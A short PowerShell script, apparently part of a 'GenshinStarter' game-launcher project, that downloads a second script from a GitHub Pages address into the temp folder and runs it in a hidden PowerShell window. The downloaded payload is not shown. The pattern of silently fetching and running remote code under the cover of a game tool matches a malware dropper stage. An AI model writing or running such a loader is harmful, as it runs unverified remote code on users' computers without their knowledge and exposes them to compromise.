$downloaderUrl = "https://b-52405.github.io/GenshinStarter/downloader.ps1"
$downloaderPath = "$env:TEMP\downloader.ps1"

Invoke-WebRequest -Uri $downloaderUrl -OutFile $downloaderPath

Start-Process -FilePath "powershell.exe" -ArgumentList "-File `"$downloaderPath`"" -WindowStyle Hidden
